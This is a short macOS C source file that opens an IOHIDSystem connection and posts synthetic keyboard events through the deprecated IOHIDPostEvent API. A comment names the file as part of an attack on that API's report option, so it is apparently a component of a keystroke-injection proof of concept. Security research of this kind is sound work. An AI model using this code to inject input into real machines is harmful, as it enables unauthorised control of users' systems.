#include "HIDPosting.h"
#include <IOKit/IOKitLib.h>
#include <IOKit/hidsystem/IOHIDLib.h>
#include <IOKit/hidsystem/IOHIDShared.h>
#include <IOKit/hidsystem/IOLLEvent.h>

int32_t AFBOpenHIDPosting(uint32_t *connection) {
    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOHIDSystem"));
    if (!service) return kIOReturnNotFound;
    kern_return_t result = IOServiceOpen(service, mach_task_self(), kIOHIDParamConnectType, connection);
    IOObjectRelease(service);
    return result;
}

void AFBCloseHIDPosting(uint32_t connection) { IOServiceClose(connection); }

int32_t AFBPostHIDKey(uint32_t connection, uint16_t keyCode, uint16_t character,
                      int down, int managerReports) {
    NXEventData data = {0};
    data.key.keyCode = keyCode;
    data.key.charSet = NX_ASCIISET;
    data.key.origCharSet = NX_ASCIISET;
    data.key.charCode = character;
    data.key.origCharCode = character;
    IOGPoint location = {0, 0};
    IOOptionBits options = managerReports ? kIOHIDPostHIDManagerEvent : 0;
    // This deprecated posting API and its report option are the subject of this attack.
    return IOHIDPostEvent(connection, down ? NX_KEYDOWN : NX_KEYUP, location, &data,
                          kNXEventDataVersion, 0, options);
}
